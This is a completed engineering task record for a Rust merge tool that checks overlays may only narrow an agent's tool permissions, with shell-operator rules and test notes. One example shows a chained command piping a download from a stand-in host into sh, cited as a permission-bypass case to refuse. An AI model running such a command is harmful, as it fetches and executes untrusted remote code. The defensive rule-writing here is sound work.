---
id: TASK-55.5.6
title: 'R4.6: Tool narrowing'
status: Done
assignee:
  - '@implementer'
created_date: '2026-11-23T12:27:00Z'
updated_date: '2026-11-23T13:38:00Z'
labels:
  - area:rust
  - area:merge
  - area:security
milestone: m-7
dependencies:
  - TASK-55.5.5
  - TASK-55.5.1
parent_task_id: TASK-55.5
priority: high
type: task
ordinal: 119390
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
Plan for this step (§7.2 narrowing rule as R4.1 writes it; owner answer 6 in TASK-55.5).
- ToolGrant { tool: NeutralTool, scope: Option<ToolScope> }, NeutralTool the closed neutral vocabulary (an unknown tool is an `agent` error). ToolScope = Path for read, write, edit, grep, glob and notebook_edit | Command for bash | Other for every other tool.
- covers(base, candidate): the same tool, and one of: the base has no scope; the scopes are equal; a Path base whose last segment is `**` and a candidate whose segments start with the base's other segments, compared whole and as written, with no `.` or `..` segment in the candidate (`docs/**` covers `docs/adr/**` and `docs/a.md`, never `docs-private/a.md`); a Command base that ends in `*` and a candidate that starts with the base's text before its trailing `*`s, where the rest of the candidate holds none of the shell operators `;` `&` `|` `<` `>` `(` `)`, a backtick, a line feed or a carriage return. Any other wildcard covers only an equal scope.
- After an overlay's tools edit, every grant must be covered by a grant of the base, unless the overlay sets allow_widen and its layer is not public; allow_widen in a public layer is a `tool-widen` error. The error names the agent, the layer and the widened entry, stripped (decision-26).
- Reference drift, described in the open as the owner asked: the TypeScript reference (src/merge/tools.ts, `covers`) treats any scope that ends in `*` as covering every candidate that starts with the scope's text before the stars. So `write:docs*` covers `write:docs-private/**`, and `bash:mise run *` covers `bash:mise run test; curl https://example.invalid/x | sh`. An overlay can therefore widen an inherited grant while the build accepts it as narrowing. The Rust alz refuses both; the acceptance cases for them are marked referenceDrift (decision-30).
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [x] #1 Test 04's cases have Rust tests with the same verdict: an overlay that adds a tool fails naming the agent, the tool and the layer, and one that removes a tool or narrows a scope passes (unit tests)
- [x] #2 A table test shows the containment rule: docs/** covers docs/adr/** and docs/a.md, neither docs* nor docs/** covers docs-private/a.md, and mise run * covers mise run test but not mise run a; b, mise run a && b, mise run a | b, mise run $(a) or mise run a > f
- [x] #3 Proptest: covers is reflexive and transitive, and without allow_widen in a non-public layer every merged grant is covered by a base grant; allow_widen is refused in a public layer and lets a private layer's overlay add a tool (unit tests)
- [x] #4 Test 04 gains referenceDrift cases (task TASK-55.5.6) for an overlay that widens through a trailing-star path scope and one that adds a shell operator to a command scope; both fail on the TypeScript reference and pass on the Rust binary by R5 (mise run test:acceptance)
<!-- AC:END -->

## Implementation Notes

<!-- SECTION:NOTES:BEGIN -->
Implementer, R4.6 (code changed and checked locally; nothing committed, ACs not ticked).
Files: alz-core item/agent/tool.rs (NeutralTool, McpToolName, ToolName, ToolScope Path|Command|Other, ToolGrant; ToolEntry removed), item/agent/vocabulary.rs (AgentRefusal::UnknownTool), diagnostic.rs (Code::ToolWiden), merge/algebra/narrowing.rs (covers, widened), merge/agents.rs (narrowing in edited_tools, allow_widen in a public layer), merge/testing.rs (layer_visible); tests: merge/algebra/narrowing/tests.rs, merge/agents/narrowing_tests.rs; acceptance: test 04 plus fixtures repo-widen-path-scope, repo-widen-command-operator and personal/agents/writer.md.
AC1: merge/agents/narrowing_tests.rs an_overlay_that_adds_a_tool_fails_naming_the_agent_the_tool_and_the_layer (04 case 1, from the fixture files) and an_overlay_that_removes_a_tool_or_narrows_a_scope_passes (04 case 2, tools read, bash:mise run test). Also: remove-and-add-back, one error per widened entry, refused overlay changes nothing, narrowing from the agent as earlier overlays left it, inherits-all list, replace overlay without base, unknown tool is an agent error.
AC2: narrowing/tests.rs a_path_scope_covers_by_whole_segments and a_command_scope_covers_what_its_star_stands_for_unless_it_holds_an_operator (tables: docs/** covers docs/adr/** and docs/a.md; docs* and docs/** do not cover docs-private/a.md; mise run * covers mise run test, not a; b, &&, |, $(a), > f, <, backtick, LF, CR); every_path_tool_compares_paths; any_other_scope_covers_only_an_equal_scope.
AC3: proptest covers_is_reflexive, covers_is_transitive (plus exhaustive transitivity over all short path and command scopes); merge/agents/narrowing_tests.rs without_allow_widen_in_a_private_layer_every_merged_grant_is_covered_by_a_base_grant (merge accepted iff all result grants covered; accepted result equals the independent list computation), with_allow_widen_in_a_private_layer_the_overlay_applies_as_written, allow_widen_in_a_public_layer_is_always_refused; unit: allow_widen lets a private overlay add a tool.
AC4: test/acceptance/04-tool-narrowing.test.ts two referenceDrift("TASK-55.5.6", ...) cases (trailing-star path scope write:docs* to write:docs-private/**; bash:mise run * plus a chained command). mise run test: both are expected failures on the reference (80 expected fail overall, 1177 passed). They pass on the Rust binary by R5 (build); not run on Rust now since alz build is R5.
Checks: mise run rust:ci exit 0; mise run lint exit 0; mise run test exit 0.
Spec gaps and choices for the architect (spec not edited):
1. Transitivity: the path rule as written is not transitive when the base's other segments end in ** (docs/**/** covers docs/**, docs/** covers docs/a, docs/**/** does not cover docs/a). The exhaustive test fails without the fix. Implemented: such a base covers only an equal scope (stricter, never looser). The spec needs one sentence for it.
2. The spec does not list the neutral tool vocabulary nor mcp__ tools. Implemented as the reference does: the 12 neutral names plus any name starting mcp__ (scope kind Other); anything else is an agent error, read in the agent file reader (so a removal of an unknown tool in an overlay is also an agent error, where the reference ignored it). An empty scope (write:) is accepted as written.
3. 'the base' in the narrowing rule is read as the agent the overlay refines (as the reference does): a later overlay may not re-widen what an earlier one narrowed; by transitivity every grant is still covered by the original base. A replace-mode overlay that defines an agent with no base is not checked.
4. A refused overlay (tool-widen, or inherits all tools) is not applied at all; the reference applied its other fields before failing. Both fail the build.
5. allow_widen in a public layer is checked before the base is looked up, so it is an error even for an overlay without a base or without a tools edit (as the reference).
6. Literal segment rule consequences: docs/** covers docs itself; ** covers any candidate without dot segments, absolute paths included; brace or other glob syntax inside a segment is not interpreted.
7. Drift cases name TASK-55.5.6 (as the AC and the spec say), not TASK-55.5.

Verified by the lead (2026-11-23): mise run rust:ci exits 0, lint passes, mise run test 1177 passed / 80 expected fail (the two new drift cases), src/ unchanged. Choices accepted (stricter or equal): a base path scope whose other segments end in ** covers only an equal scope (transitivity), unknown tools refused when read (so -[unknown] is an agent error), the base is the agent the overlay refines, a refused overlay is not applied, allow_widen in a public layer is checked first; the drift cases use referenceDrift('TASK-55.5.6').
<!-- SECTION:NOTES:END -->

## Final Summary

<!-- SECTION:FINAL_SUMMARY:BEGIN -->
Tool narrowing merges in alz-core: ToolGrant with path, command or other scopes; covers is a preorder (reflexive and transitive, property-tested) with the owner's stricter containment rule (whole path segments; no added shell operators); every grant of an overlay must be covered by its base unless allow_widen in a non-public layer; each widened entry is a tool-widen error. Test 04 gains two reference-drift cases.
<!-- SECTION:FINAL_SUMMARY:END -->
